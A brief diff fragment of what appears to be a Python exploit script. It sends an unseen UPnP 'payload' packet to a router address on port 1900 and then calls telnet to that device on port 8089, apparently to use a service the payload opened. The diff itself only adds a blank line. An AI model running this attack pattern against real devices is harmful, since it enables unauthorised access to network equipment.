@@ -27,4 +27,5 @@ s.sendto(payload, ("192.168.0.1", 1900))
 s.close()
  
 sleep(1)
+
 system("telnet 192.168.0.1 8089")
